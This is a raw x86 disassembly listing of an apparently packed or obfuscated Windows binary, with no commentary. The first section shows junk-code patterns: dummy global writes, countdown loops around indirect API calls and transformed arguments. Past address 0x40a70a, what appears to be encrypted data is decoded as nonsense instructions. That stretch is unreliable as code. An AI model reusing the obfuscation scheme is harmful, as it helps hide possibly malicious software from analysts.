  40a44c:	jmp    0x40a3fc
  40a451:	mov    edi,DWORD PTR [ebp+0x8]
  40a454:	mov    eax,ds:0x42e435
  40a459:	and    DWORD PTR ds:0x42a00c,0x728
  40a463:	mov    eax,DWORD PTR [eax+0x198]
  40a469:	xor    edi,ecx
  40a46b:	mov    edx,0x3272dd
  40a470:	and    DWORD PTR ds:0x42b010,0x42d000
  40a47a:	add    edi,edx
  40a47c:	mov    DWORD PTR ds:0x429000,0x5af1
  40a486:	cmp    DWORD PTR [eax],edi
  40a488:	je     0x40a49f
  40a48e:	mov    DWORD PTR ds:0x429000,0x225c
  40a498:	mov    eax,DWORD PTR [eax]
  40a49a:	jmp    0x40cc18
  40a49f:	mov    eax,0x3847
  40a4a4:	mov    eax,DWORD PTR [ebp+0x18]
  40a4a7:	cmp    eax,esi
  40a4a9:	mov    DWORD PTR ds:0x429014,0x6496
  40a4b3:	jne    0x40a4d7
  40a4b9:	mov    DWORD PTR ds:0x42b000,0x18c7
  40a4c3:	push   0xf89c85b2
  40a4c8:	mov    DWORD PTR ds:0x42c014,0x18
  40a4d2:	jmp    0x40cc07
  40a4d7:	mov    esi,DWORD PTR [ebp+0x18]
  40a4da:	mov    DWORD PTR ds:0x42b000,ebx
  40a4e0:	mov    eax,0xf89c85b3
  40a4e5:	cmp    esi,eax
  40a4e7:	mov    DWORD PTR ds:0x42b008,0x2007
  40a4f1:	jne    0x40cbf7
  40a4f7:	mov    eax,ds:0x42c008
  40a4fc:	xor    DWORD PTR ds:0x429004,eax
  40a502:	mov    eax,DWORD PTR [ebp+0x10]
  40a505:	dec    esi
  40a506:	xor    eax,ecx
  40a508:	adc    esi,DWORD PTR ds:0x42d008
  40a50e:	add    eax,edx
  40a510:	xor    esi,esi
  40a512:	or     esi,DWORD PTR ds:0x42c008
  40a518:	adc    DWORD PTR ds:0x42d010,esi
  40a51e:	mov    DWORD PTR [ebp-0x18],eax
  40a521:	mov    eax,DWORD PTR [ebp+0xc]
  40a524:	adc    DWORD PTR ds:0x42d010,0x3da6
  40a52e:	mov    esi,DWORD PTR [ebp-0x8]
  40a531:	xor    eax,ecx
  40a533:	add    DWORD PTR ds:0x42d018,0x6859
  40a53d:	add    eax,edx
  40a53f:	imul   eax,DWORD PTR [esi]
  40a542:	mov    esi,DWORD PTR [ebp+0x8]
  40a545:	or     DWORD PTR ds:0x42d014,0x363e
  40a54f:	xor    esi,ecx
  40a551:	mov    DWORD PTR ds:0x42b010,0xc36
  40a55b:	add    esi,edx
  40a55d:	mov    DWORD PTR ds:0x42d010,0x490b
  40a567:	cmp    esi,eax
  40a569:	mov    eax,ds:0x42d018
  40a56e:	mov    eax,DWORD PTR [ebp-0x4]
  40a571:	push   ebx
  40a572:	mov    DWORD PTR ds:0x42a008,0x30a3
  40a57c:	je     0x40a688
  40a582:	mov    DWORD PTR ds:0x42d008,0x4e69
  40a58c:	mov    esi,DWORD PTR [ebp-0x18]
  40a58f:	or     DWORD PTR ds:0x42a01c,0x42c010
  40a599:	add    DWORD PTR [eax],esi
  40a59b:	mov    DWORD PTR ds:0x42b00c,0x14
  40a5a5:	cmp    DWORD PTR ds:0x42b00c,0x0
  40a5ac:	je     0x40a5f7
  40a5b2:	cmp    DWORD PTR ds:0x42b00c,0x3
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x42e0a1
  40a5c4:	push   0x42e035
  40a5c9:	call   DWORD PTR ds:0x42ed3d
  40a5cf:	cmp    DWORD PTR ds:0x42b00c,0x4
  40a5d6:	jne    0x40a5e7
  40a5dc:	mov    eax,ds:0x42b00c
  40a5e1:	dec    eax
  40a5e2:	mov    ds:0x42b00c,eax
  40a5e7:	mov    eax,ds:0x42b00c
  40a5ec:	dec    eax
  40a5ed:	mov    ds:0x42b00c,eax
  40a5f2:	jmp    0x40a5a5
  40a5f7:	mov    eax,DWORD PTR [ebp-0x4]
  40a5fa:	mov    DWORD PTR ds:0x42d004,0x12
  40a604:	cmp    DWORD PTR ds:0x42d004,0x0
  40a60b:	je     0x40a64f
  40a611:	cmp    DWORD PTR ds:0x42d004,0x21
  40a618:	jne    0x40a633
  40a61e:	push   0x5688
  40a623:	push   0x5318
  40a628:	push   0x314e
  40a62d:	call   DWORD PTR ds:0x42ed41
  40a633:	mov    esi,DWORD PTR ds:0x42d004
  40a639:	dec    esi
  40a63a:	mov    DWORD PTR ds:0x42d004,esi
  40a640:	jmp    0x40a604
  40a645:	sub    DWORD PTR ds:0x42c010,0x7728
  40a64f:	mov    esi,DWORD PTR [ebp+0xc]
  40a652:	add    DWORD PTR ds:0x42c018,0x42b00c
  40a65c:	xor    esi,ecx
  40a65e:	xor    DWORD PTR ds:0x429020,0x39e1
  40a668:	add    esi,edx
  40a66a:	xor    DWORD PTR ds:0x42b00c,0x429028
  40a674:	imul   esi,DWORD PTR [eax]
  40a677:	mov    DWORD PTR [eax],esi
  40a679:	mov    DWORD PTR ds:0x42d000,0x1b30
  40a683:	jmp    0x40a68f
  40a688:	and    edi,edi
  40a68a:	mov    esi,DWORD PTR [ebp+0x14]
  40a68d:	xor    DWORD PTR [eax],esi
  40a68f:	sbb    eax,edi
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	mov    DWORD PTR ds:0x429020,0x1e
  40a69e:	cmp    DWORD PTR ds:0x429020,0x0
  40a6a5:	je     0x40a6f7
  40a6ab:	cmp    DWORD PTR ds:0x429020,0xf
  40a6b2:	jne    0x40a6cb
  40a6b8:	push   DWORD PTR [ebp-0x24]
  40a6bb:	push   0x42b000
  40a6c0:	push   0x2936
  40a6c5:	call   DWORD PTR ds:0x42ed45
  40a6cb:	cmp    DWORD PTR ds:0x429020,0x10
  40a6d2:	jne    0x40a6e5
  40a6d8:	mov    esi,DWORD PTR ds:0x429020
  40a6de:	dec    esi
  40a6df:	mov    DWORD PTR ds:0x429020,esi
  40a6e5:	mov    esi,DWORD PTR ds:0x429020
  40a6eb:	dec    esi
  40a6ec:	mov    DWORD PTR ds:0x429020,esi
  40a6f2:	jmp    0x40a69e
  40a6f7:	mov    edi,DWORD PTR [ebp+0x10]
  40a6fa:	xor    edi,ecx
  40a6fc:	mov    esi,0xffcd8d23
  40a701:	mov    ebx,esi
  40a703:	sub    ebx,edi
  40a705:	jmp    0x40caae
  40a70a:	inc    ecx
  40a70b:	sbb    al,0x8b
  40a70e:	fwait
  40a70f:	jnp    0x40a702
  40a711:	mov    BYTE PTR [ebx+0xb57c083],bl
  40a717:	daa    
  40a718:	pop    ss
  40a719:	xor    eax,0x7a7a046d
  40a71e:	out    0x5f,al
  40a720:	jp     0x40a79c
  40a722:	push   esp
  40a723:	xchg   edx,eax
  40a724:	imul   ebx,eax,0x2f
  40a727:	xchg   esp,eax
  40a728:	or     al,0x15
  40a72a:	or     DWORD PTR [ebp-0x5],ebp
  40a72d:	push   cs
  40a72e:	loop   0x40a79e
  40a730:	xchg   ebp,eax
  40a731:	or     eax,0xc5f39deb
  40a736:	rol    BYTE PTR [eax+0x4e],1
  40a739:	lds    edx,FWORD PTR [eax+0x67220f92]
  40a73f:	xchg   esi,eax
  40a740:	push   esi
  40a741:	mov    esi,0x62e44b3a
  40a746:	adc    ebp,DWORD PTR [edx-0x38]
  40a749:	inc    ebx
  40a74a:	stc    
  40a74b:	and    DWORD PTR [ecx-0x285b5eaa],0x79
  40a752:	cwde   
  40a753:	ret    0x2b71
  40a756:	or     BYTE PTR [edx],bl
  40a758:	cwde   
  40a759:	jno    0x40a793
  40a75b:	pop    eax
  40a75c:	sbb    eax,0xa056f4e6
  40a761:	in     eax,dx
  40a762:	mov    cl,0xc8
  40a764:	lea    edx,[ecx+ecx*2-0x2]
  40a768:	xor    DWORD PTR [esi-0x52],esp
  40a76b:	(bad)  
  40a76d:	xlat   BYTE PTR ds:[ebx]
  40a76e:	mov    esi,0x1d763f32
  40a773:	fwait
  40a774:	xchg   edx,eax
  40a775:	sbb    esp,DWORD PTR [edi+0x4c]
  40a778:	mov    edi,0x69a9e424
  40a77d:	adc    ah,bh
  40a77f:	jge    0x40a790
  40a781:	ins    BYTE PTR es:[edi],dx
  40a782:	mov    fs,WORD PTR [esi+0x461805e0]
  40a788:	cmp    ah,0x25
  40a78b:	(bad)  
  40a78c:	jmp    0xfad65517
  40a791:	call   0xa4d:0xb168675b
  40a798:	adc    esp,DWORD PTR [esi-0xf]
  40a79b:	jae    0x40a726
  40a79d:	add    al,0xf0
  40a79f:	inc    edx
  40a7a0:	cs push esi
  40a7a2:	icebp  
  40a7a3:	xor    eax,0x3ea46e1e
  40a7a9:	test   dl,bh
  40a7ab:	aas    
  40a7ac:	std    
  40a7ad:	std    
  40a7ae:	mov    ah,BYTE PTR [ebp-0x5a]
  40a7b1:	and    DWORD PTR [ecx],esi
  40a7b3:	int3   
  40a7b4:	rol    DWORD PTR [ecx],cl
  40a7b6:	sbb    BYTE PTR [ecx-0x211ecd2d],dh
  40a7bc:	xor    al,0x60
  40a7be:	xchg   esp,eax
  40a7bf:	mov    cl,0xfb
  40a7c1:	mov    DWORD PTR [edx+0x1e],ecx
  40a7c4:	ins    BYTE PTR es:[edi],dx
  40a7c5:	pop    ss
  40a7c6:	sub    BYTE PTR [ebp-0x5e],cl
  40a7c9:	add    DWORD PTR [eax],eax
  40a7cb:	push   cs
  40a7cc:	outs   dx,BYTE PTR ds:[esi]
  40a7cd:	xor    esi,edi
  40a7cf:	mov    ds:0xed83cc94,eax
  40a7d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7d5:	xchg   ebx,eax
  40a7d6:	outs   dx,BYTE PTR ds:[esi]
  40a7d7:	xor    BYTE PTR [eax-0x483b7f91],dl
  40a7dd:	push   cs
  40a7de:	std    
  40a7df:	scas   al,BYTE PTR es:[edi]
  40a7e0:	fucom  st(6)
  40a7e2:	push   cs
  40a7e3:	arpl   WORD PTR [edx],bx
  40a7e5:	into   
  40a7e6:	xor    ah,ch
  40a7e8:	push   ebx
  40a7e9:	push   edi
  40a7ea:	out    dx,al
  40a7eb:	push   edx
  40a7ec:	mov    ds:0x2a4902be,al
  40a7f1:	outs   dx,BYTE PTR ds:[esi]
  40a7f2:	push   es
  40a7f3:	push   edi
  40a7f4:	ins    DWORD PTR es:[edi],dx
  40a7f5:	add    eax,0xfa747956
  40a7fa:	enter  0x7e1b,0x24
  40a7fe:	jl     0x40a7db
  40a800:	(bad)  
  40a801:	jmp    FWORD PTR [ecx-0x33]
  40a804:	push   ebp
  40a805:	fsub   DWORD PTR [edx]
  40a807:	add    DWORD PTR [edi-0x18ebe91a],eax
  40a80d:	push   0xffffff9f
  40a80f:	and    eax,0xe2bb8d37
  40a814:	cmp    eax,0x94bbeac2
  40a819:	out    dx,al
  40a81a:	jns    0x40a7e3
  40a81c:	or     eax,0x9448ae16
  40a821:	inc    ebp
  40a822:	jle    0x40a7b9
  40a824:	sub    al,0xd8
  40a826:	popa   
  40a827:	push   ss
  40a828:	mov    ebx,DWORD PTR [esi+0x64744776]
  40a82e:	ds jb  0x40a880
  40a831:	mov    eax,0x75931ecb
  40a836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a837:	jb     0x40a89e
  40a839:	mov    bl,0x5e
  40a83b:	cdq    
  40a83c:	fdiv   DWORD PTR [ebx]
  40a83e:	out    dx,eax
  40a83f:	imul   esi,esp,0x8
  40a842:	and    eax,0xf76ca86a
  40a847:	sti    
  40a848:	cmp    dh,BYTE PTR [ebp-0x413fc1f3]
  40a84e:	pop    esi
  40a84f:	call   0x71bb:0xda6c
  40a855:	or     al,0xcc
  40a857:	and    esi,DWORD PTR [edx]
  40a859:	and    eax,0xcb8b884a
  40a85e:	xor    eax,0x49e7fc54
  40a863:	push   ds
  40a864:	int    0x70
  40a866:	pop    ds
  40a867:	fbld   TBYTE PTR [ecx+eax*4-0x52beb359]
  40a86e:	outs   dx,BYTE PTR ds:[esi]
  40a86f:	inc    ebx
  40a870:	int3   
  40a871:	inc    esi
  40a872:	cmc    
  40a873:	sar    BYTE PTR [ebx+0x3942b90b],1
  40a879:	sti    
  40a87a:	mov    al,BYTE PTR [edi-0x76]
  40a87d:	mov    ah,0x2e
  40a87f:	mov    bh,0xef
  40a881:	dec    eax
  40a882:	outs   dx,BYTE PTR ds:[esi]
  40a883:	out    dx,al
  40a884:	or     ebp,ebp
  40a886:	inc    edi
  40a887:	sub    ecx,edx
  40a889:	cmp    BYTE PTR [esi-0x72],0x86
  40a88d:	dec    ebx
  40a88e:	cmp    DWORD PTR [ecx],eax
  40a890:	sbb    eax,0x1e1c4189
  40a895:	or     al,0x51
  40a897:	cmp    bl,BYTE PTR [edi+ebx*1-0x31]
  40a89b:	jecxz  0x40a8ff
  40a89d:	arpl   di,si
  40a89f:	jl     0x40a918
  40a8a1:	popa   
  40a8a2:	aam    0xb5
  40a8a4:	or     ebx,DWORD PTR [edi-0x70]
  40a8a7:	push   ss
  40a8a8:	adc    dh,BYTE PTR [eax+0x638f0429]
  40a8ae:	mov    edi,0xd7258f5b
  40a8b3:	add    BYTE PTR [eax-0x1e],dh
  40a8b6:	adc    bh,dl
  40a8b8:	dec    ecx
  40a8b9:	inc    esi
  40a8ba:	adc    eax,DWORD PTR [ecx+0x6df2738]
  40a8c0:	cdq    
  40a8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8c2:	and    BYTE PTR [edx-0x4065e658],0x1
  40a8c9:	jmp    0x8d2f:0x2388fc9f
  40a8d0:	stos   DWORD PTR es:[edi],eax
  40a8d1:	push   eax
  40a8d2:	mov    al,ds:0xcfcbb2c3
  40a8d7:	mov    ebx,0x86c64112
  40a8dc:	sbb    al,0xc8
  40a8de:	xchg   DWORD PTR [esi-0x12b7a659],ebp
  40a8e4:	fdivr  QWORD PTR [ebp+0x1ee15bbf]
  40a8ea:	push   0xfffffff4
  40a8ec:	and    dl,BYTE PTR [edx+0x7d7f0b96]
  40a8f2:	aas    
  40a8f3:	int3   
  40a8f4:	inc    edx
  40a8f5:	std    
  40a8f6:	in     al,0x6c
  40a8f8:	stos   DWORD PTR es:[edi],eax
  40a8f9:	in     al,0xb9
  40a8fb:	aas    
  40a8fc:	jle    0x40a905
  40a8fe:	fcmove st,st(5)
  40a900:	adc    al,0x4b
  40a902:	stos   DWORD PTR es:[edi],eax
  40a903:	or     al,0xd1
  40a905:	ror    eax,0xa3
  40a908:	xchg   DWORD PTR [ebp-0x2d7be25f],edx
  40a90e:	aad    0xba
  40a910:	push   ecx
  40a911:	into   
  40a912:	pusha  
  40a913:	fist   DWORD PTR ds:0x9bae3d5e
  40a919:	cli    
  40a91a:	test   al,0xeb
  40a91c:	cmp    dl,0x11
  40a91f:	xor    ebx,DWORD PTR [ebp+0x4e214b5]
  40a925:	add    bl,dh
  40a927:	std    
  40a928:	fs ins BYTE PTR es:[edi],dx
  40a92a:	jne    0x40a97a
  40a92c:	popf   
  40a92d:	adc    edi,esp
  40a92f:	and    ebp,ebx
  40a931:	mov    esp,?
  40a933:	jle    0x40a962
  40a935:	cmp    eax,0x85bb5c01
  40a93a:	popa   
  40a93b:	ret    
  40a93c:	inc    ebx
  40a93d:	imul   esp,ecx,0x22e93cbe
  40a943:	icebp  
  40a944:	cdq    
  40a945:	leave  
  40a946:	inc    ecx
  40a947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a948:	pop    edx
  40a949:	fld    TBYTE PTR [eax+0x53]
  40a94c:	into   
  40a94d:	xor    BYTE PTR [ebp+0x3d358bb2],ah
  40a953:	add    dh,BYTE PTR [edi]
  40a955:	ret    0x18c4
  40a958:	add    edi,esi
  40a95a:	in     al,dx
  40a95b:	rcl    ebp,cl
  40a95d:	sbb    bl,BYTE PTR [eax+0x4f]
  40a960:	div    BYTE PTR [ecx-0x2f417d5b]
  40a966:	call   0x347b95f7
  40a96b:	xor    DWORD PTR [ecx+edi*8],ebx
  40a96e:	inc    edx
  40a96f:	adc    al,0xc6
  40a971:	fdivr  DWORD PTR [esi+0x46df8db6]
  40a977:	mov    ch,0x70
  40a979:	mov    gs,WORD PTR [edi+0x7121bc00]
  40a97f:	mov    ecx,0x1c856d24
  40a984:	cli    
  40a985:	rcl    BYTE PTR [edi+0x54],0xa4
  40a989:	dec    ebp
  40a98a:	cli    
  40a98b:	mov    WORD PTR [ebp+0x588c21c4],ds
  40a991:	inc    ebp
  40a992:	iret   
  40a993:	int    0x63
  40a995:	xchg   DWORD PTR [ebx+0x52],ebp
  40a998:	lahf   
  40a999:	fist   WORD PTR [ecx+eax*1+0x1d]
  40a99d:	inc    edi
  40a99e:	stc    
  40a99f:	call   0x7927:0x5ebb6f55
  40a9a6:	inc    eax
  40a9a7:	out    0x71,eax
  40a9a9:	mov    bh,0xfe
  40a9ab:	cdq    
  40a9ac:	lock jne 0x40a9af
  40a9af:	shl    BYTE PTR [ecx-0x39c1f5b7],cl
  40a9b5:	add    BYTE PTR [edx+ebp*2-0xd2493eb],bl
  40a9bc:	test   al,0x54
  40a9be:	pop    ebp
  40a9bf:	mov    ah,0xee
  40a9c1:	ins    BYTE PTR es:[edi],dx
  40a9c2:	daa    
  40a9c3:	sbb    eax,0xe7c89961
  40a9c8:	mov    ?,ecx
  40a9ca:	pushf  
  40a9cb:	ja     0x40a979
  40a9cd:	xchg   ebx,eax
  40a9ce:	mov    esi,0xdbd220bf
  40a9d3:	xor    bl,0xa3
  40a9d6:	(bad)  
  40a9d7:	out    0x6,eax
  40a9d9:	div    DWORD PTR [ecx-0x7efc0865]
  40a9df:	aad    0xb7
  40a9e1:	call   0xbfb6bc4b
  40a9e6:	adc    BYTE PTR [edx-0x1e99056],bl
  40a9ec:	sti    
  40a9ed:	aad    0xa6
  40a9ef:	dec    edi
  40a9f0:	jns    0x40a9e0
  40a9f2:	mov    dl,0x7
  40a9f4:	pop    eax
  40a9f5:	dec    edx
  40a9f6:	pop    esp
  40a9f7:	imul   edi,DWORD PTR [ecx+esi*1],0x6e
  40a9fb:	mov    ebp,0x3189f98c
  40aa00:	add    BYTE PTR [eax-0x7f889bcf],cl
  40aa06:	outs   dx,BYTE PTR ds:[esi]
  40aa07:	fadd   QWORD PTR [ecx]
  40aa09:	mov    eax,ds:0xec35052
  40aa0e:	pop    edi
  40aa0f:	dec    eax
  40aa10:	cmp    BYTE PTR [esi+0x65],bl
  40aa13:	xchg   ebx,eax
  40aa14:	cmp    BYTE PTR [edi],cl
  40aa16:	js     0x40aa46
  40aa18:	mov    eax,ds:0x568e5910
  40aa1d:	lock loope 0x40aa89
  40aa20:	xchg   ebp,eax
  40aa21:	es pop ecx
  40aa23:	mov    ah,0x3b
  40aa25:	pop    ds
  40aa26:	retf   
  40aa27:	out    0x12,eax
  40aa29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa2a:	xchg   ebp,eax
  40aa2b:	lahf   
  40aa2c:	rcr    BYTE PTR [edx+ecx*8-0x4c010da],cl
  40aa33:	lock xor eax,0x7bdbc352
  40aa39:	and    ebp,DWORD PTR [eax-0x63]
  40aa3c:	popf   
  40aa3d:	dec    esi
  40aa3e:	inc    edi
  40aa3f:	pop    esp
  40aa40:	ret    0x12d2
  40aa43:	loope  0x40aa5b
  40aa45:	int    0xf9
  40aa47:	add    eax,0x19ed17a0
  40aa4c:	fs mov ah,0x81
  40aa4f:	and    BYTE PTR [ecx+0xa],bl
  40aa52:	std    
  40aa53:	daa    
  40aa54:	mov    ecx,0x7ecfe9ca
  40aa59:	dec    edx
  40aa5a:	lea    eax,[ebp+ebx*2+0x693428af]
  40aa61:	mov    gs,WORD PTR [ebx]
  40aa63:	rcpps  xmm1,XMMWORD PTR [ecx-0x7e]
  40aa67:	js     0x40aaca
  40aa69:	(bad)  
  40aa6a:	pop    edi
  40aa6b:	xchg   ecx,eax
  40aa6c:	inc    esi
  40aa6d:	les    ebx,FWORD PTR [ebp+0x717fecce]
  40aa73:	inc    eax
  40aa74:	mov    dh,0x34
  40aa76:	xchg   edx,ebp
  40aa78:	push   ds
  40aa79:	stc    
  40aa7a:	outs   dx,DWORD PTR ds:[esi]
  40aa7b:	je     0x40aa63
  40aa7d:	bound  esi,QWORD PTR [eax+0x7b]
  40aa80:	out    dx,al
  40aa81:	cmp    BYTE PTR [esi+0x4],0x34
  40aa85:	scas   eax,DWORD PTR es:[edi]
  40aa86:	cmp    al,BYTE PTR [eax]
  40aa88:	add    ebx,ecx
  40aa8a:	mov    edx,0xffe576a1
  40aa8f:	ret    
  40aa90:	jnp    0x40aad2
  40aa92:	push   esi
  40aa93:	pop    ebx
  40aa94:	neg    cl
  40aa96:	mov    BYTE PTR ss:[edi],cl
  40aa99:	in     al,dx
  40aa9a:	repnz sub DWORD PTR [edx],edi
  40aa9d:	loope  0x40aaf5
  40aa9f:	push   ebp
  40aaa0:	ficom  WORD PTR [eax]
  40aaa2:	rol    BYTE PTR [ebp+0x66],1
  40aaa5:	inc    esi
  40aaa6:	js     0x40aa2e
  40aaa8:	imul   esi,DWORD PTR [ebx+0x11958b8b],0xad988b8f
  40aab2:	daa    
  40aab3:	or     edi,ebp
  40aab5:	int3   
  40aab6:	sbb    eax,0xaa898aec
  40aabb:	hlt    
  40aabc:	stos   DWORD PTR es:[edi],eax
  40aabd:	dec    ecx
  40aabe:	jne    0x40aa7a
  40aac0:	jbe    0x40aa73
  40aac2:	popf   
  40aac3:	sbb    cl,bl
  40aac5:	adc    ecx,DWORD PTR [eax-0x414d2843]
  40aacb:	scas   al,BYTE PTR es:[edi]
  40aacc:	mov    dh,0x1
  40aace:	push   0xffffffce
  40aad0:	xchg   BYTE PTR [esi],al
  40aad2:	lods   al,BYTE PTR ds:[esi]
  40aad3:	push   ss
  40aad4:	and    al,0x95
  40aad6:	xor    BYTE PTR [edi+0x5409f1d8],dh
  40aadc:	jge    0x40aad5
  40aade:	lods   eax,DWORD PTR ds:[esi]
  40aadf:	out    dx,eax
  40aae0:	js     0x40ab25
  40aae2:	aaa    
  40aae3:	and    al,ch
  40aae5:	dec    ebp
  40aae6:	or     DWORD PTR [edx-0x48],ebp
  40aae9:	or     ebp,ebp
  40aaeb:	adc    eax,0x6e6aa278
  40aaf0:	pop    ss
  40aaf1:	jbe    0x40ab65
  40aaf3:	jge    0x40ab72
  40aaf5:	stos   DWORD PTR es:[edi],eax
  40aaf6:	mov    gs,WORD PTR [esi-0x29421402]
  40aafc:	mov    al,0xf2
  40aafe:	sub    DWORD PTR [ebp-0x63],ebx
  40ab01:	xchg   edx,esp
  40ab03:	lds    eax,FWORD PTR [ecx-0x2b]
  40ab06:	sbb    bh,cl
  40ab08:	cld    
  40ab09:	xchg   edi,eax
  40ab0a:	sbb    BYTE PTR [ebx],0xe6
  40ab0d:	sbb    DWORD PTR [ebx-0xdf41377],0x142b28ee
  40ab17:	xor    DWORD PTR [edx+ecx*8-0xca64095],esi
  40ab1e:	and    ah,BYTE PTR [edx+edx*8]
  40ab21:	pop    ss
  40ab22:	dec    ecx
  40ab23:	pushf  
  40ab24:	jb     0x40ab9d
  40ab26:	jb     0x40ab3d
  40ab28:	cmovae esp,ecx
  40ab2b:	frstor [edx-0x13]
  40ab2e:	push   0xeb9a8d18
  40ab33:	mov    DWORD PTR [eax],esi
  40ab35:	aam    0xaa
  40ab37:	xchg   BYTE PTR [ebx],cl
  40ab39:	in     al,dx
  40ab3a:	scas   al,BYTE PTR es:[edi]
  40ab3b:	xor    DWORD PTR [esi+ecx*2-0x75],esp
  40ab3f:	xchg   ecx,eax
  40ab40:	xlat   BYTE PTR ds:[ebx]
  40ab41:	ss cmp ch,ch
  40ab44:	jmp    0xda8d:0x626b41a
  40ab4b:	ins    BYTE PTR es:[edi],dx
  40ab4c:	imul   edx,DWORD PTR [ebx-0x2],0xffffff9e
  40ab50:	inc    ecx
  40ab51:	dec    esp
  40ab52:	pop    ecx
  40ab53:	push   eax
  40ab54:	push   esi
  40ab55:	dec    edx
  40ab56:	mov    bl,0xec
  40ab58:	(bad)  [ecx-0x48bcdb44]
  40ab5e:	js     0x40abac
  40ab60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab61:	test   al,0xdf
  40ab63:	enter  0x7968,0xb5
  40ab67:	int    0x33
  40ab69:	imul   edi,DWORD PTR [edx+edi*2-0x20],0xa3cd3b08
  40ab71:	cmp    ebp,eax
  40ab73:	sbb    ecx,DWORD PTR [edx+0x69b86818]
  40ab79:	pop    ecx
  40ab7a:	mov    edx,0xd4da5385
  40ab7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab80:	(bad)  
  40ab81:	in     eax,dx
  40ab82:	xchg   ebp,eax
  40ab83:	xchg   ebx,eax
  40ab84:	push   cs
  40ab85:	cmp    esp,DWORD PTR [ecx]
  40ab87:	mov    ebx,0x376a9d0b
  40ab8c:	pop    esp
  40ab8d:	pop    es
  40ab8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab8f:	jle    0x40ac0a
  40ab91:	mov    edx,0x315117d5
  40ab96:	mov    al,0xaa
  40ab98:	sbb    al,0x49
  40ab9a:	mov    edi,0xb7d534d4
  40ab9f:	add    ch,bl
  40aba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aba2:	test   eax,0xf90e048f
  40aba7:	sub    ecx,DWORD PTR ds:0x53fbc174
  40abad:	or     esp,DWORD PTR ds:0x4e48b7e4
  40abb3:	(bad)  
  40abb4:	xor    dl,BYTE PTR [ebp-0x5dcdcb90]
  40abba:	jecxz  0x40ab45
  40abbc:	mov    WORD PTR [ebp-0x407c8403],fs
  40abc2:	push   ebx
  40abc3:	clc    
  40abc4:	ror    DWORD PTR gs:[eax+0x6],0x66
  40abc9:	dec    esp
  40abca:	sti    
  40abcb:	push   ebp
  40abcc:	int3   
  40abcd:	adc    eax,0x65b1d5a6
  40abd2:	je     0x40abbf
  40abd4:	popf   
  40abd5:	xchg   esp,eax
  40abd6:	gs sbb eax,0xb544163b
  40abdc:	or     BYTE PTR [ecx+0x4f],0x7c
  40abe0:	(bad)  
  40abe1:	fwait
  40abe2:	sbb    eax,0x63236507
  40abe7:	test   al,0xd3
  40abe9:	pop    ebp
  40abea:	addr16 jl 0x40ab94
  40abed:	mov    al,ds:0x5e89e574
  40abf2:	dec    esp
  40abf3:	and    ah,ch
  40abf5:	ror    DWORD PTR [edx+0x65c9c303],cl
  40abfb:	stc    
  40abfc:	mov    cl,0xbc
  40abfe:	nop
  40abff:	add    ah,al
  40ac01:	pushf  
  40ac02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac03:	inc    edx
  40ac04:	js     0x40ac67
  40ac06:	lods   eax,DWORD PTR ds:[esi]
  40ac07:	iret   
  40ac08:	sar    BYTE PTR [ecx-0x1ffad18a],0x9a
  40ac0f:	inc    ebx
  40ac10:	cli    
  40ac11:	fsubr  st,st(7)
  40ac13:	mov    dl,0x8f
  40ac15:	cmp    DWORD PTR [eax+esi*8+0x1196e4a6],edx
  40ac1c:	mov    bl,0xf9
  40ac1e:	test   eax,0x61e42f11
  40ac23:	dec    ebp
  40ac24:	cmp    ah,BYTE PTR [edi]
  40ac26:	call   0xbee47efe
  40ac2b:	ins    BYTE PTR es:[edi],dx
  40ac2c:	stc    
  40ac2d:	fcmovne st,st(6)
  40ac2f:	push   esi
  40ac30:	std    
  40ac31:	jbe    0x40ac7c
  40ac33:	ins    DWORD PTR es:[edi],dx
  40ac34:	mov    edi,0xe924daba
  40ac39:	jmp    0x3e10:0x298c5f54
  40ac40:	test   DWORD PTR [edi+0xa35647b],ecx
  40ac46:	ror    DWORD PTR [edi+0x13],cl
  40ac49:	sbb    al,0x2a
  40ac4b:	mov    edx,DWORD PTR [ebp+0x21691c1f]
  40ac51:	ret    0x9d9
  40ac54:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40ac56:	mov    ebp,0x119cc155
  40ac5b:	jne    0x40ac88
  40ac5d:	sti    
  40ac5e:	xchg   ecx,eax
  40ac5f:	dec    edi
  40ac60:	add    dl,0xdd
  40ac63:	je     0x40ace4
  40ac65:	jns    0x40ac3a
  40ac67:	mov    ds,WORD PTR [ebp+0x6ab10d53]
  40ac6d:	jg     0x40ac12
  40ac6f:	xchg   esi,eax
  40ac70:	or     al,0x4
  40ac72:	pop    eax
  40ac73:	fld    QWORD PTR [ebp-0x5c3383c3]
  40ac79:	aam    0x5f
  40ac7b:	xor    bh,BYTE PTR [edx-0x4b2e40df]
  40ac81:	dec    edi
  40ac82:	dec    ebx
  40ac83:	adc    ebx,DWORD PTR [edx]
  40ac85:	xor    DWORD PTR [ecx+0x34f4a287],ecx
  40ac8b:	loopne 0x40ac2a
  40ac8d:	ss inc eax
  40ac8f:	jp     0x40acc8
  40ac91:	xor    BYTE PTR [esp+ebp*1],ch
  40ac94:	and    ebp,edi
  40ac96:	retf   
  40ac97:	xor    BYTE PTR [ecx+0x291d7547],ch
  40ac9d:	sub    BYTE PTR [ecx-0x11056a87],ah
  40aca3:	lea    edx,[eax]
  40aca5:	cdq    
  40aca6:	or     eax,0xff258d4f
  40acab:	dec    ebp
  40acac:	xor    bl,BYTE PTR [ecx+ecx*4-0x4cc37a60]
  40acb3:	cmp    al,0xe8
  40acb5:	or     eax,0xf389fffb
  40acba:	add    BYTE PTR [ecx],0x4a
  40acbd:	xchg   ebp,eax
  40acbe:	dec    esp
  40acbf:	mov    WORD PTR [esi+0x1af2e469],cs
  40acc5:	adc    BYTE PTR [edi+0x46],0x39
  40acc9:	mov    WORD PTR [edx],cs
  40accb:	xchg   BYTE PTR [ebx-0x2b],bh
  40acce:	push   ebx
  40accf:	in     eax,dx
  40acd0:	jne    0x40ac5b
  40acd2:	xchg   ebp,eax
